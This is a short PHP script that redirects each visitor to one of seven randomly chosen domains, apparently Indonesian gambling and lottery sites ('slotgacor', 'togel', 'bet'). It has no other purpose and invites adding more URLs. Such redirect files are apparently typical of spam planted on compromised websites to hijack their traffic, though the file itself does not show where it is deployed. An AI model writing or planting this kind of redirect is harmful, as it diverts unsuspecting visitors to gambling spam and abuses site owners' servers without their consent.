<?php
// Array of URLs to redirect to
$urls = [
    'https://sateslotgacor.xyz',
    'https://megaforwinbet.online',
    'https://nasgorbetkecap.pro',
    'https://nagaforwinapi.xyz',
    'https://burungbetsip.fun',
    'https://bimatoto77.xyz',
    'https://buditogeljitu.online',
    // Add more URLs here
];

// Pick a random URL from the array
$random_url = $urls[array_rand($urls)];

// Redirect to the selected URL
header("Location: $random_url");
exit();
?>
